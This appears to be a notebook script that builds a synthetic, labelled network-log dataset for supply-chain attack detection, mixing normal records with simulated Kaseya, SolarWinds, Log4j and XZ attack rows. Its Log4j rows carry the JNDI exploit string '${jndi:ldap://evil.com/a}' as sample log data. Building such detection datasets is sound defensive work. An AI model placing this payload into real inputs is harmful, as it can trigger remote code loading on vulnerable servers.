import pandas as pd, numpy as np, random, json, os
from datetime import datetime, timedelta
from faker import Faker
fake = Faker()
random.seed(42); np.random.seed(42)
BASE = "/content/drive/MyDrive/ChainGuard_Data"
os.makedirs(BASE, exist_ok=True)
KNOWN_VENDORS = [...]
MALICIOUS_IPS = [...]

def gen_normal(n=50000):
    data = []
    for _ in range(n):
        data.append({
            "timestamp": (datetime.now() - timedelta(minutes=random.randint(0,4320))).isoformat(),
            "src_ip": f"192.168.1.{random.randint(10,250)}",
            "dst_ip": random.choice(KNOWN_VENDORS),
            "process_name": random.choice(["svchost.exe","msiexec.exe","updater.exe","wsappx.exe","java.exe"]),
            "file_hash": fake.sha256(),
            "signature_status": random.choice(["Microsoft","Authenticode","Valid","Google"]),
            "outbound_conn_5min": random.randint(1,15),
            "dns_query": random.choice(KNOWN_VENDORS),
            "log_line": fake.sentence(),
            "jndi_present": 0,
            "entropy": round(random.uniform(3.5, 5.5),3),
            "label": "normal"
        })
    return pd.DataFrame(data)
def gen_kaseya(n=2000):
    return pd.DataFrame([{
        "src_ip": "192.168.1.100",
        "dst_ip": random.choice(MALICIOUS_IPS),
        "process_name": "agent.exe",
        "signature_status": "Unsigned",
        "outbound_conn_5min": random.randint(60,300),
        "dns_query": "c2.revil-kaseya.net",
        "log_line": "Kaseya VSA agent update deployed with malicious DLL",
        "entropy": random.uniform(7.2,7.9),
        "label": "kaseya_attack"
    } for _ in range(n)])
def gen_solarwinds(n=1200):
    return pd.DataFrame([{
        "dst_ip": "avsvmcloud.com",
        "process_name": "SolarWinds.Orion.exe",
        "dns_query": "<random_string>.avsvmcloud.com",
        "label": "solarwinds_attack"
    } for _ in range(n)])
def gen_jndi_attack(n=500):
    data = []
    for _ in range(n):
        data.append({
            "timestamp": (datetime.now() - timedelta(minutes=random.randint(0,4320))).isoformat(),
            "src_ip": f"192.168.1.{random.randint(10,250)}",
            "dst_ip": random.choice(MALICIOUS_IPS),
            "process_name": "java.exe",
            "file_hash": fake.sha256(),
            "signature_status": random.choice(["Unsigned", "Invalid"]),
            "outbound_conn_5min": random.randint(1,15),
            "dns_query": "malicious.ldap.server",
            "log_line": "${jndi:ldap://evil.com/a}",
            "jndi_present": 1,
            "entropy": round(random.uniform(5.5, 6.5),3),
            "label": "jndi_attack"
        })
    return pd.DataFrame(data)
def gen_log4j(n=2500):
    # Reusing the structure of gen_jndi_attack, as Log4j is a JNDI vulnerability
    data = []
    for _ in range(n):
        data.append({
            "timestamp": (datetime.now() - timedelta(minutes=random.randint(0,4320))).isoformat(),
            "src_ip": f"192.168.1.{random.randint(10,250)}",
            "dst_ip": random.choice(MALICIOUS_IPS),
            "process_name": "java.exe",
            "file_hash": fake.sha256(),
            "signature_status": random.choice(["Unsigned", "Invalid"]),
            "outbound_conn_5min": random.randint(1,15),
            "dns_query": "malicious.ldap.server",
            "log_line": "${jndi:ldap://evil.com/a}", # Classic Log4j payload
            "jndi_present": 1,
            "entropy": round(random.uniform(5.5, 6.5),3),
            "label": "log4j_attack" # Changed label to log4j_attack
        })
    return pd.DataFrame(data)

def gen_xz(n=800):
    # Creating a new function for XZ attack based on common patterns
    data = []
    for _ in range(n):
        data.append({
            "timestamp": (datetime.now() - timedelta(minutes=random.randint(0,4320))).isoformat(),
            "src_ip": f"10.0.0.{random.randint(10,250)}",
            "dst_ip": random.choice(KNOWN_VENDORS),
            "process_name": "sshd", # Common process targeted by XZ
            "file_hash": fake.sha256(),
            "signature_status": "Compromised_Signature", # Indicative of supply chain attack
            "outbound_conn_5min": random.randint(5,50), # Elevated outbound connections
            "dns_query": "malicious.xz.domain", # Specific C2 domain
            "log_line": "Detected backdoor activity in liblzma", # Specific log line
            "jndi_present": 0,
            "entropy": round(random.uniform(6.0, 7.0),3),
            "label": "xz_attack"
        })
    return pd.DataFrame(data)

df1 = gen_normal(50000)
df2 = gen_kaseya(2000)
df3 = gen_solarwinds(1200)
df4 = gen_log4j(2500)
df5 = gen_xz(800)

full = pd.concat([df1,df2,df3,df4,df5], ignore_index=True)
full = full.sample(frac=1, random_state=42).reset_index(drop=True)   